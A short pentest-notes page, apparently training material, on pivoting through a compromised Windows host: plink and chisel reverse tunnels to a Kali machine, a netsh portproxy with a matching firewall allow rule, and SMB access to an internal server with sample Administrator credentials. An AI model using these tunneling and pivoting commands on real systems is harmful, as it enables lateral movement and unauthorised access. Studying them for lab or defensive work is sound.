---
title: Tunneling
permalink: /Tunneling/Windows
---
C:\Windows\system32>netstat -anpb TCP
Proto Local Address Foreign Address State
TCP   0.0.0.0:3306  0.0.0.0:0       LISTENING
[mysqld.exe]

C:\Tools\port_redirection_and_tunneling>cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
                                        piping with a prompt                  user  password   Kali machine   target   mysql port

kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234

## Or use chisel
```./chisel client 10.10.14.6:8000 R:8086:127.0.0.1:8086```

## NETSH

We have compromised a Windows 10 target through a remote vulnerability and were able to successfully elevate our privileges to SYSTEM. After enumerating the compromised machine, we discover that in addition to being connected to the current network (10.11.0.x). It has an additional network interface that seems to be connected to a different network (192.168.1.x). In this internal subnet, we identify a Windows Server 2016 machine (192.168.1.110) that has TCP port 445 open. With our privilege, netsh can be used. The Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use

```C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.11```

```C:\Windows\system32>netstat -anp TCP | find "4455"```` 
 
Adding a firewall rule to allow inbound connections on that port  
``C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow``` 
 We allow (action=allow) specific inbound (dir=in) connections and leverage the firewall (advfirewall) context of netsh
 
Modify smb conf  
```kali@kali:~$ cat /etc/samba/smb.conf  
min protocol = SMB2  
kali@kali:~$ sudo /etc/init.d/smbd restart  
kali@kali:~$ smbclient -L 10.11.0.22 --port=4455 --user=Administrator```  

Better to mount a share, because smbclient might raise timeout issue

```kali@kali:~$ sudo mkdir /mnt/win10_share```
```kali@kali:~$ sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share```
